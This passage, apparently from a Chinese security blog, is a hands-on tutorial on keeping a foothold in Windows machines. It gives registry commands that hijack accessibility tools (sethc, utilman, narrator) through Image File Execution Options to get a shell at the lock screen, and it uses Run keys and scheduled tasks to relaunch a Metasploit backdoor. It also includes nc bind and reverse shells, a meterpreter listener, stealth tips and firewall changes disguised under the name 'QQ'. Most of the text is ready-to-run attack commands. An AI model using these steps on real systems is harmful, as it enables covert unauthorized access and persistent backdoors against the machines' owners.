,通过该参数我们可以实现偷梁换柱。</p><blockquote><p>注意：</p><ul><li>即&#x3D;&#x3D;可执行文件的文件名&#x3D;&#x3D;只要在上述的注册表项下，出于简化原因，IFEO使用&#x3D;&#x3D;忽略路径的方式&#x3D;&#x3D;来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。</li></ul></blockquote><p>核心思路就是在唤醒这些辅助功能的时候，顺带唤醒我们的后门程序~就可以达到我们的目的。实际上就是劫持正常程序替换为我们的后门程序~~~</p><h2 id="常用辅助功能"><a href="#常用辅助功能" class="headerlink" title="常用辅助功能"></a>常用辅助功能</h2><blockquote><p>win+R 运行osk即可使用屏幕键盘，其他亦是类似</p></blockquote><ol><li>Shift（sethc）</li><li>屏幕键盘（osk）</li></ol><blockquote><p>如图所示~~在锁屏时，我们也可以通过轻松访问选项，轻易的唤醒这些程序，什么屏幕键盘啊，讲述人啊，唤醒后，我们就可以顺带的执行我们的后门程序~，是不是很nice</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241318882.png" alt="image-20220824131837506" style="zoom: 25%;" /></blockquote><ol start="3"><li><p>辅助工具管理器（Utilman）</p></li><li><p>讲述人（Narrator）</p></li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="IE"><a href="#IE" class="headerlink" title="IE"></a>IE</h3><p>以修改IE启动程序为例，实现运行IE程序但是启动的却是cmd。</p><ol><li>找到注册表 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>  目录下的 iexplore.exe</li><li>添加一个 debugger 字符串键值，并且赋值为 cmd.exe  的执行路径: <code>C:Windows\system32\cmd.exe</code></li><li>运行 iexplore.exe</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f      </span><br></pre></td></tr></table></figure><h3 id="Narrator"><a href="#Narrator" class="headerlink" title="Narrator"></a>Narrator</h3><p>劫持 Narrator  讲述人</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><blockquote><p>并且要注意到：</p><ul><li><p>Narrator讲述人这种“轻松访问”里面的功能，都不需要登录，即可唤醒~~</p><p>这意味着什么呢？意味着我们即使输入了错误的密码，也可以通过点击远程桌面的外面“轻松服务”的功能，来执行我们的后门程序~</p><p>我们只需要用如上方式劫持这些服务即可~~~</p></li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241916409.png" alt="image-20220824191658167" style="zoom: 33%;" /></blockquote><ul><li>演示：</li></ul><p>我们按照上述方式将我们的msf后门程序的位置写入注册表：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\Users\Administrator\Desktop\msf_6666_win64.exe&quot; /f</span><br></pre></td></tr></table></figure><p>在msf开启监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler -p windows/x64/meterpreter_reverse_tcp -H 124.223.217.243 -P 6666</span><br></pre></td></tr></table></figure><p>触发narrator.exe:</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208242010233.png" alt="image-20220824201031038" style="zoom:33%;" /><p>msf接收到会话~~</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208242043464.png" alt="image-20220824204333272"></p></blockquote><h3 id="Utilman"><a href="#Utilman" class="headerlink" title="Utilman"></a>Utilman</h3><p>劫持辅助工具管理器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure><h3 id="Notepad（较隐蔽）"><a href="#Notepad（较隐蔽）" class="headerlink" title="Notepad（较隐蔽）"></a>Notepad（较隐蔽）</h3><blockquote><p>比较隐蔽的一种，而且记事本用户用的也算比较多~~。&#x3D;&#x3D;这种劫持呢，不会影响正常程序的执行&#x3D;&#x3D;~</p></blockquote><p>实现原程序退出后静默运行后门程序。以执行 notepad  为例，退出后静默运行 calc.exe</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:\Windows\system32\calc.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#这后面两步，修改的注册表项是HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe的内容</span><br><span class="line">当用户退出后，用户会执行一个程序calc.exe</span><br><span class="line">SilentProcessExit表示程序退出后，会静默执行~~</span><br></pre></td></tr></table></figure><h3 id="Shift"><a href="#Shift" class="headerlink" title="Shift"></a>Shift</h3><blockquote><p>l连按五次shift，即使是锁屏，连续按五次sheift也会唤出粘滞键</p></blockquote><p>在 windows  登陆的时候按五次 shift  打开 cmd  进行操作。</p><p>前提条件:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的 sethc.exe  应用程序进行转移，并生成 sethc.exe.bak  文件。并将 cmd.exe  拷贝覆盖 sethc.exe 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir sethc.exe</span><br><span class="line">move sethc.exe sethc.exe.bak</span><br><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure><p>但是在 windows xp 过后，sethc组件属于完全受信用的&#x3D;&#x3D;用户 TrustInstall&#x3D;&#x3D; ，我们无法修改名字</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250058068.png" alt="image-20220825005849922"></p><p>这时候即使 administrators 都只有名义上的只读和可执行权，我们可以&#x3D;&#x3D;手动修改其所属为 administrators&#x3D;&#x3D; ，步骤如下：（这个步骤其实如果拿不到远程桌面还是很难搞的，搞定了权限问题，才能进行替换伪造！）</p><blockquote><ol><li>右键属性&#x2F;安全&#x2F;高级</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250105955.png" alt="image-20220825010524695" style="zoom: 33%;" /><ol start="2"><li>所有者&#x2F;编辑&#x2F;添加当前用户&#x2F;应用&#x2F;确定</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250107050.png" alt="image-20220825010756762" style="zoom:33%;" /><ol start="3"><li><p>关闭窗口</p></li><li><p>右键属性&#x2F;安全&#x2F;编辑</p></li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250110801.png" alt="image-20220825011030550" style="zoom:33%;" /><ol start="5"><li>选择Administrators(或者你的当前组)&#x2F;勾选完全控制&#x2F;确定</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250111590.png" alt="image-20220825011117423" style="zoom:33%;" /><p>修改完权限之后，才能正常进行操作：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208250113623.png" alt="image-20220825011351506"></p><p>此时，按五次 shift  就可以打开 cmd了~~~~  </p></blockquote><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote><p>上述的各种劫持方式，在msf中有自动化的工具~~</p><p>Metasploit 框架提供了一个后渗透模块，可实现自动化地利用沾滞键的权限维持技术。该模块将用 CMD 替代辅助功能的二进制文件（&#x3D;&#x3D;sethc, osk, disp, utilman&#x3D;&#x3D;）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/manage/sticky_keys</span><br><span class="line">show options</span><br><span class="line">修改target、session</span><br><span class="line">exe选项可以修改为自定义的后门程序</span><br></pre></td></tr></table></figure><p>当目标主机的屏幕被锁定时，执行 osk 屏幕键盘工具将会打开一个具有 system 级别权限的命令提示符。</p><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211339693.png" alt="image-20220821133932476" style="zoom:33%;" /></blockquote><h1 id="开机自启动注册表项"><a href="#开机自启动注册表项" class="headerlink" title="开机自启动注册表项"></a>开机自启动注册表项</h1><blockquote><ul><li>注册表的 <strong>HKEY_LOCAL_MACHINE  和 HKEY_CURRENT_USER  键的区别</strong>：前者对所有用户有效，后者只对当前用户有效</li><li>电脑启动的时候就会从注册表中启动相应的配置</li><li>msconfig命令查看启动项</li></ul></blockquote><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><p>每次启动登录时都会按顺序自动执行。对这些注册表项要有一个清楚的认知~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure><h2 id="RunOnce"><a href="#RunOnce" class="headerlink" title="RunOnce"></a>RunOnce</h2><p>仅会被自动执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><h2 id="RunServicesOnce"><a href="#RunServicesOnce" class="headerlink" title="RunServicesOnce"></a>RunServicesOnce</h2><p>程序会在系统加载时自动启动执行一次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</span><br></pre></td></tr></table></figure><h2 id="RunServices"><a href="#RunServices" class="headerlink" title="RunServices"></a>RunServices</h2><p>RunServices是继RunServicesOnce之后启动的程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices</span><br></pre></td></tr></table></figure><h2 id="RunOnceEx"><a href="#RunOnceEx" class="headerlink" title="RunOnceEx"></a>RunOnceEx</h2><p><strong>Windows XP&#x2F;2003 特有的自启动注册表项</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx</span><br></pre></td></tr></table></figure><h2 id="Load"><a href="#Load" class="headerlink" title="Load"></a>Load</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</span><br></pre></td></tr></table></figure><h2 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h2><p>注意下面的 Notify、Userinit、Shell键值也会有自启动的程序，而且其键值可以用逗号分隔，从而实现登录的时候启动多个程序。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><p>这里以nc为例，大家思路开放点，比如替换为生成的反弹 shell 的 payload 。</p><blockquote><p>在以下的payload中，如果有特别的显眼的字眼，可以替换为其他的字符，比如nc，这个名字可以替换为其他常见程序~</p><p>一定要注意 正向连接一定要有端口开放，不然防火墙会墙掉！！！！！</p></blockquote><h2 id="简单介绍nc语法"><a href="#简单介绍nc语法" class="headerlink" title="简单介绍nc语法"></a>简单介绍nc语法</h2><p>nc 在Linux和Windows下都可以用</p><blockquote><ul><li>NC.exe常用命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ...</span><br><span class="line">listen for inbound:     nc -l -p port [options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">-G num          source-routing pointer: 4, 8, 12, ...</span><br><span class="line">        -l 使用监听模式，管控传入的资料。</span><br><span class="line">        -L              listen harder, re-listen on socket close </span><br><span class="line">        -n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">        -o&lt;输出文件&gt; 指定文件名称，把往来传输的流量数据以16进制字码倾倒成该文件保存。</span><br><span class="line">        -p&lt;通信端口&gt; 设置本地主机使用的通信端口。</span><br><span class="line">        -u 使用UDP传输协议。</span><br><span class="line">        -v 显示指令执行过程。更详细的信息。两次-v会有更多详细信息</span><br><span class="line">        -e 绑定某个程序，使用端口</span><br><span class="line">        -e prog         inbound program to exec [dangerous!!]</span><br><span class="line">        -d              detach from console, background mode       </span><br><span class="line">        -h              this cruft</span><br><span class="line">        -i secs         delay interval for lines sent, ports scanned          </span><br><span class="line">        -r              randomize local and remote ports</span><br><span class="line">        -s addr         local source address</span><br><span class="line">        -t              answer TELNET negotiation</span><br><span class="line">        -w secs         timeout for connects and final net reads</span><br></pre></td></tr></table></figure><ul><li>用nc正向shell</li></ul><p>原理：被控端使用nc将&#x2F;bin&#x2F;sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell</p><blockquote><p>目标机器：</p><blockquote><p>-v:可以显示详细的信息，不过为了隐蔽性我们一般不-v<br>-d:为了隐藏我们的nc，一般是需要-d，以隐藏程序<br>-e:绑定某个程序，使用端口,我们为了反弹shell，将cmd和某个端口绑定，其他机器访问ip+端口即可访问cmd</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc.exe -Lp 5555 -d -e cmd.exe</span><br><span class="line">或者：</span><br><span class="line">nc -lvvp 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p>控制机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc64.exe 目标机器ip 5555</span><br><span class="line">比如：nc 10.10.1.7 6666</span><br></pre></td></tr></table></figure></blockquote><ul><li>用nc反弹shell</li></ul><p>原理： 被控端使用nc将&#x2F;bin&#x2F;sh发送到控制端的6666端口，控制端只需要监听本地的6666端口，即可获得shell。</p><blockquote><p>目标机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.10.1.11 6666</span><br></pre></td></tr></table></figure><p>控制机器：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure></blockquote></blockquote><h2 id="在-meterpreter-下"><a href="#在-meterpreter-下" class="headerlink" title="在 meterpreter 下"></a>在 meterpreter 下</h2><blockquote><p>meterpreter下已经写好了相应的reg的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; reg</span><br><span class="line">Usage: reg [command] [options]</span><br><span class="line">Interact with the target machine&#x27;s registry.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d   The data to store in the registry value.</span><br><span class="line">    -h   Help menu.</span><br><span class="line">    -k   The registry key path (E.g. HKLM\Software\Foo).</span><br><span class="line">    -r   The remote machine name to connect to (with current process credentials</span><br><span class="line">    -t   The registry value type (E.g. REG_SZ).</span><br><span class="line">    -v   The registry value name (E.g. Stuff).</span><br><span class="line">    -w   Set KEY_WOW64 flag, valid values [32|64].</span><br><span class="line">COMMANDS:</span><br><span class="line"></span><br><span class="line">    enumkey     Enumerate the supplied registry key [-k &lt;key&gt;]</span><br><span class="line">    createkey   Create the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    deletekey   Delete the supplied registry key  [-k &lt;key&gt;]</span><br><span class="line">    queryclass  Queries the class of the supplied key [-k &lt;key&gt;]</span><br><span class="line">    setval      Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]. Use a binary blob to set binary data with REG_BINARY type (e.g. setval -d ef4ba278)</span><br><span class="line">    deleteval   Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]</span><br><span class="line">    queryval    Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]</span><br></pre></td></tr></table></figure></blockquote><p>#参数的含义 在上面都有讲</p><ol><li>上传nc</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/nc.exe C:\\windows\\system32</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252323645.png" alt="image-20220825232315482"></p><ol start="2"><li>查询注册表项</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252325723.png" alt="image-20220825232520555"></p><ol start="3"><li>设置注册表项的值</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#x27;C:\windows\system32\nc.exe -Ldp 5555 -e cmd.exe&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252326358.png" alt="image-20220825232613173"></p><ol start="4"><li>查看注册表项的值</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252326060.png" alt="image-20220825232647904"></p><ol start="5"><li>&#x3D;&#x3D;关于防火墙&#x3D;&#x3D;</li></ol><p>#从外面访问内部的时候，可能会被防火墙墙掉，如果是直接关闭防火墙又太过明显，我们可以开启某个端口~~~</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">execute –f cmd –i –<span class="built_in">H</span></span><br><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall add portopening TCP <span class="number">5555</span> <span class="string">&quot;QQ&quot;</span> ENABLE ALL</span><br><span class="line"><span class="comment">#重启生效</span></span><br><span class="line">shutdown <span class="literal">-r</span> <span class="operator">-f</span> <span class="literal">-t</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><ol start="6"><li>msf开启socks5代理:</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ol start="7"><li>配置proxychains</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252332889.png" alt="image-20220825233232726" style="zoom: 50%;" /><ol start="8"><li>配置msf路由</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br><span class="line">run autoroute -s 192.168.1.0/24</span><br></pre></td></tr></table></figure><ol start="9"><li>通过proxychains，nc正向连接</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nc 192.168.1.132 5555</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208252350917.png" alt="image-20220825235050673" style="zoom:50%;" /><h2 id="在目标-cmd-下"><a href="#在目标-cmd-下" class="headerlink" title="在目标 cmd 下"></a>在目标 cmd 下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload /root/nc.exe C:\\windows\\system32</span><br><span class="line">shell</span><br><span class="line">reg query HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line">reg add HKLM\software\microsoft\windows\currentversion\run /v </span><br><span class="line">nc /t REG_SZ /d &quot;C:\windows\system32\nc.exe -Ldp 5555 -e cmd.exe&quot;</span><br><span class="line">reg query HKLM\software\microsoft\windows\currentversion\run /v nc</span><br><span class="line"></span><br><span class="line">execute –f cmd –i –H</span><br><span class="line">netsh firewall show opmode</span><br><span class="line">netsh firewall add portopening TCP 5555 &quot;QQ&quot; ENABLE ALL</span><br><span class="line">shutdown -r -f -t 0</span><br></pre></td></tr></table></figure><h1 id="schtasks计划任务-很常见"><a href="#schtasks计划任务-很常见" class="headerlink" title="schtasks计划任务 (很常见)"></a>schtasks计划任务 (很常见)</h1><h2 id="查看计划任务："><a href="#查看计划任务：" class="headerlink" title="查看计划任务："></a>查看计划任务：</h2><ul><li>taskschd.msc 调出计划任务图形界面(推荐)</li><li>schtasks &#x2F;query</li><li>cmd命令：schtasks&gt;schtasks.txt</li><li>powshell命令：Get-ScheduledTask</li><li>单击【开始】&gt;【运行】；输入 cmd，然后输入at( schtasks.exe)，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</li><li>单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</li></ul><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>创建test定时任务，每分钟执行一次5555.exe</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">1</span> /tr C:\Users\Administrator\Desktop\msf_6666_win64.exe /tn test</span><br><span class="line"><span class="comment">#删除</span></span><br><span class="line">schtasks /delete /tn test</span><br><span class="line"><span class="comment">#查询</span></span><br><span class="line">schtasks /query /tn test</span><br></pre></td></tr></table></figure><h2 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看帮助</span><br><span class="line">SCHTASKS /Create /?</span><br><span class="line"></span><br><span class="line">#创建新的计划任务</span><br><span class="line">schtasks /create</span><br><span class="line">指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。</span><br><span class="line"></span><br><span class="line">#频率</span><br><span class="line">/sc schedule</span><br><span class="line">指定任务在其计划类型内的运行频率。</span><br><span class="line">有效计划任务:  MINUTE、 HOURLY、DAILY、WEEKLY、MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.</span><br><span class="line"></span><br><span class="line">#频率的数量</span><br><span class="line">/mo modifier</span><br><span class="line">改进计划类型以允许更好地控制计划重复周期。有效值列于下面“修改者”部分中。这个参数对于 MONTHLY 计划是必需的。对于MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。</span><br><span class="line">修改者: 按计划类型的 /MO 开关的有效值:</span><br><span class="line">    MINUTE:  1 到 1439 分钟。</span><br><span class="line">    HOURLY:  1 - 23 小时。</span><br><span class="line">    DAILY:   1 到 365 天。</span><br><span class="line">    WEEKLY:  1 到 52 周。</span><br><span class="line">    ONCE:    无修改者。</span><br><span class="line">    ONSTART: 无修改者。</span><br><span class="line">    ONLOGON: 无修改者。</span><br><span class="line">    ONIDLE:  无修改者。</span><br><span class="line">    MONTHLY: 1 到 12，或</span><br><span class="line">             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY。</span><br><span class="line">    ONEVENT:  XPath 事件查询字符串</span><br><span class="line"></span><br><span class="line">#执行的程序或者命令    </span><br><span class="line">/tr &lt;TaskRun&gt;</span><br><span class="line">指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在Systemroot\System32 目录下。</span><br><span class="line"></span><br><span class="line">#指定任务的名称。</span><br><span class="line">/tn &lt;TaskName&gt;</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><blockquote><p>schtasks命令详解：<a href="https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html">https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html</a></p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#每分钟执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">1</span> /tn calc_update /tr <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#每小时执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> HOURLY /mo <span class="number">1</span> /tn calc_update /tr  <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#每天执行一次任务。</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> DAILY /mo <span class="number">1</span> /tn calc_update /tr  <span class="string">&quot;C:\Users\Administrator\Desktop\mx\5555.exe&quot;</span></span><br><span class="line"><span class="comment">#删除计划任务。</span></span><br><span class="line">schtasks /Delete /TN 任务名称 /F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#示例:</span></span><br><span class="line"><span class="comment">#比如说hexo每隔三十分钟自动更新</span></span><br><span class="line"><span class="comment">#不能同时用两次双引号怎么办？</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">30</span> /tn hexo_update /tr <span class="string">&quot;cmd /c &quot;</span>F: &amp;&amp; <span class="built_in">cd</span> F:\Haoran\桌面\myblog &amp;&amp; hexo g <span class="literal">-d</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这个命令却意外的生成了正确的计划任务</span></span><br><span class="line">schtasks /create /<span class="built_in">sc</span> MINUTE /mo <span class="number">30</span> /tn hexo_update /tr <span class="string">&quot;cmd /c &#x27;F: &amp;&amp; cd F:\Haoran\桌面\myblog &amp;&amp; hexo g -d&quot;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">#执行结果</span></span><br><span class="line"><span class="string">成功: 成功创建计划任务 &quot;hexo_update&quot;。</span></span><br><span class="line"><span class="string">#输入taskschd.msc查看计划任务</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#官方实例：</span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;doc&quot;，该机器每小时在 &quot;runasuser&quot; 用户下运行 notepad.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC HOURLY /TN doc /TR notepad</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 上创建计划任务 &quot;accountant&quot;，在指定的开始日期和结束日期之间的开始时间和结束时间内，每隔五分钟运行 calc.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN accountant /TR calc.exe /ST 12:00 /ET 14:00 /SD 06/06/2006 /ED 06/06/2006 /RU runasuser /RP userpassword</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务 &quot;gametime&quot;，在每月的第一个星期天运行“空当接龙”。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /SC MONTHLY /MO first /D SUN /TN gametime /TR c:\windows\system32\freecell</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;report&quot;，每个星期运行 notepad.exe。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U user /P password /RU runasuser /RP runaspassword /SC WEEKLY /TN report /TR notepad.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 在远程机器 &quot;ABC&quot; 创建计划任务 &quot;logtracker&quot;，每隔五分钟从指定的开始时间到无结束时间，运行 notepad.exe。将提示输入 /RP 码。</span></span><br><span class="line"><span class="string">SCHTASKS /Create /S ABC /U domain\user /P password /SC MINUTE /MO 5 /TN logtracker /TR c:\windows\system32\notepad.exe /ST 18:30 /RU runasuser /RP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">==&gt; 创建计划任务 &quot;gaming&quot;，每天从 12:00 点开始到14:00 点自动结束，运行 freecell.exe。</span></span><br><span class="line"><span class="string">SCHTASKS 